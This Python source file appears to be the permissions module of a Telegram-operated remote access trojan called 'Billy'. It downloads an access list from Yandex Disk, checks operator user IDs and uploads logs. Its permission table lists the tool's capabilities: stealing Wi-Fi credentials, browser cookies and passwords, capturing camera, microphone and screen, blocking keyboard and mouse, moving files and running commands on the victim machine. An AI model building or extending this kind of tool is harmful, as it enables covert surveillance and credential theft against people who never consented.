import yadisk
import config
import json
import os
from modules import NetworkDrive
from modules import Environment
from modules import Logs
import time
from datetime import datetime
import constants


last_log_update_time = time.time()
time_for_update = 120

permissions_path = config.root_path + 'permissions.json'
tmp_permissions_path = config.tmp_dir_path + 'permissions.json'
you_have_not_permissions = 'Sorry, but you haven\'t got this permission :('


permissions_names = {'ALL': 'ALL',
                     constants.MENU: 'Menu',
                     constants.ADMIN: "Admin", constants.ADMIN_UPDATE: 'Admin/update', constants.ADMIN_DELETE: 'Admin/delete',
                     constants.ADMIN_MANAGEPERMISSIONS: 'Admin/managepermissions', constants.ADMIN_DELETEOLDBILLY: 'Admin/deleteoldbilly',
                     constants.ADMIN_GETLOGS: 'Admin/getlogs', constants.ADMIN_CLEARLOGS: 'Admin/clearlogs',
                     constants.ADMIN_STOPBILLY: 'Admin/stopBilly',
                     constants.CAMERA: 'Camera', constants.CAMERA_SHOT: 'Camera/shot', constants.CAMERA_VIDEO: 'Camera/video',
                     constants.NETWORK: 'Network', constants.NETWORK_GETIPMAC: 'Network/getipmac',
                     constants.KEYBOARD: 'Keyboard', constants.KEYBOARD_SHORTCUT: 'Keyboard/keyboardshortcut',
                     constants.KEYBOARD_BLOCK: 'Keyboard/keyboardblock', constants.KEYBOARD_SPAM: 'Keyboard/keyboardspam',
                     constants.KEYBOARD_PRINT: 'Keyboard/print',
                     constants.WIFI: 'WIFI', constants.WIFI_STEALER: 'WIFI/stealer', constants.WIFI_SHOWWIFI: 'WIFI/showwifi',
                     constants.MOUSE: "Mouse", constants.MOUSE_MOVE: "Mouse/move", constants.MOUSE_LEFTCLICK: 'Mouse/leftclick',
                     constants.MOUSE_RIGHTCLICK: 'Mouse/rightclick', constants.MOUSE_DOUBLECLICK: 'Mouse/doubleclick',
                     constants.MOUSE_PRESS: 'Mouse/press', constants.MOUSE_UNPRESS: 'Mouse/unpress',
                     constants.MOUSE_GETPOSITION: 'Mouse/getposition', constants.MOUSE_SCROLL: 'Mouse/scroll',
                     constants.MOUSE_BLOCK: 'Mouse/block', constants.MOUSE_SPAM: 'Mouse/spam',
                     constants.MICROPHONE: 'Microphone', constants.MICROPHONE_GETDEVICES: 'Microphone/getdevices',
                     constants.MICROPHONE_RECORD: 'Microphone/record',
                     constants.SCREEN: 'Screen', constants.SCREEN_GETSIZE: 'Screen/getsize', constants.SCREEN_SCREEN: 'Screen/screen',
                     constants.BROWSER: 'Browser', constants.BROWSER_OPENURL: 'Browser/openurl',
                     constants.BROWSER_STEALCOOKIE: "Browser/stealcookie", constants.BROWSER_STEALPASSWORDS: "Browser/stealpasswords",
                     constants.FILE: 'File', constants.FILE_GETINF: 'File/getinf', constants.FILE_CREATEFILE: 'File/createfile',
                     constants.FILE_CREATEDIR: 'File/createdir', constants.FILE_COPY: 'File/copy', constants.FILE_UPLOAD: 'File/upload',
                     constants.FILE_DOWNLOAD: 'File/download', constants.FILE_REMOVE: 'File/remove',
                     constants.PHOTO: 'Photo', constants.PHOTO_OPENPHOTO: 'Photo/openphoto',
                     constants.PHOTO_CHANGEWALLPAPERS: 'Photo/changewallpapers',
                     constants.COMMAND: 'Command', constants.COMMAND_RUNCOMMAND: 'Command/runcommand',
                     constants.RESTART: 'Restart', constants.TEMP: 'Temp',
                     constants.ABOUT: 'About', constants.ABOUT_GETVERSION: 'About/getversion', constants.ABOUT_AUTHOR: 'About/author'}


def getTime():
    now = datetime.now()
    return now.strftime("%Y-%m-%d %H:%M:%S")


def get():
    Environment.create()

    NetworkDrive.download(config.permittions_path, tmp_permissions_path)

    with open(tmp_permissions_path) as file:
        permissions = json.load(file)

    os.remove(tmp_permissions_path)
    return permissions


def check_permission(message, permission: str):
    global last_log_update_time

    permissions = get()
    parent = getParent(permission)
    id = str(message.from_user.id)

    is_valid_user = 0

    if id not in permissions.keys():
        is_valid_user = 0
    else:
        allowed = permissions[id]["allowed"]
        forbidden = permissions[id]["forbidden"]

        if ('ALL' in allowed or permission in allowed or parent in allowed) and not (permission in forbidden or parent in forbidden):
            is_valid_user = 1

    if is_valid_user:
        Logs.addLog(message, getTime(), "Successfull", permission)
    else:
        Logs.addLog(message, getTime(), " Forbidden ", permission)

    time_now = time.time()

    if time_now - last_log_update_time >= time_for_update:
        last_log_update_time = time_now
        Logs.uploadlog()

    return is_valid_user


def getPermission(mode):
    return permissions_names[mode]


def update(new_permission):
    client = yadisk.Client(token=config.yadisk_token)

    client.remove(config.permittions_path)

    with open(tmp_permissions_path, 'w') as file:
        json.dump(new_permission, file)

    client.upload(tmp_permissions_path, config.permittions_path)

    os.remove(tmp_permissions_path)


def add(new_permissions):
    permissions = get()

    permissions[new_permissions[0]] = new_permissions[1]

    update(permissions)


def getParent(permission):
    parent = None
    if '/' in permission:
        parent = permission.split('/')[0]
    return parent
